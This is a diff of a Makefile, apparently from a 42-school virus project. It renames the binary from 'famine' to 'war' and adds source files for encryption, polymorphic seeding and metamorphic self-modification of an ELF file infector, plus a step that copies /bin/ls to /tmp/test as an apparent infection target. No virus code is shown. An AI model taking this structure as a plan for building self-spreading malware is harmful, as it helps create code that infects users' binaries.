@@ -3,33 +3,36 @@
 #                                                         :::      ::::::::    #
 #    Makefile                                           :+:      :+:    :+:    #
 #                                                     +:+ +:+         +:+      #
-#    By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+         #
+#    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2018/04/10 17:19:11 by agrumbac          #+#    #+#              #
-#    Updated: 2019/06/15 17:08:32 by ichkamo          ###   ########.fr        #
+#    Updated: 2019/12/13 09:12:39 by anselme          ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
 ############################## BIN #############################################
 
-NAME = famine
+NAME = war
 
 SRC =	famine.s                      \
+	decypher.s                    \
 	utils.c                       \
 	syscall.c                     \
 	detect_spy.c                  \
-	decrypt.s                     \
 	infect/virus.c                \
 	infect/accessors.c            \
 	infect/adjust_references.c    \
 	infect/copy_to_clone.c        \
-	infect/encrypt.s              \
+	infect/cypher.s               \
 	infect/file_iterator.c        \
 	infect/find_entry.c           \
+	infect/generate_cypher.c      \
 	infect/can_infect.c           \
 	infect/infect.c               \
 	infect/iterators.c            \
+	infect/metamorph_self.c       \
 	infect/packer.c               \
+	infect/polymorphic_seed.c     \
 	infect/setup_payload.c        \
 	main.c
 
@@ -87,17 +90,18 @@ ${NAME}: ${OBJ}
 	@echo ${B}Compiling [${NAME}]...${X}
 	@${CC} ${LDFLAGS} -o $@ ${OBJ}
 	@echo ${G}Success"   "[${NAME}]${X}
+	cp /bin/ls /tmp/test/
 
 ${OBJDIR}/%.o: ${SRCDIR}/%.s
 	@echo ${Y}Compiling [$@]...${X}
 	@/bin/mkdir -p ${OBJDIR} ${OBJDIR}/infect
-	${AS} ${ASFLAGS} -o $@ $<
+	@${AS} ${ASFLAGS} -o $@ $<
 	@printf ${UP}${CUT}
 
 ${OBJDIR}/%.o: ${SRCDIR}/%.c
 	@echo ${Y}Compiling [$@]...${X}
 	@/bin/mkdir -p ${OBJDIR} ${OBJDIR}/infect
-	${CC} ${CFLAGS} ${LDFLAGS} -c -o $@ $<
+	@${CC} ${CFLAGS} ${LDFLAGS} -c -o $@ $<
 	@printf ${UP}${CUT}
 
 ############################### DEBUG ##########################################
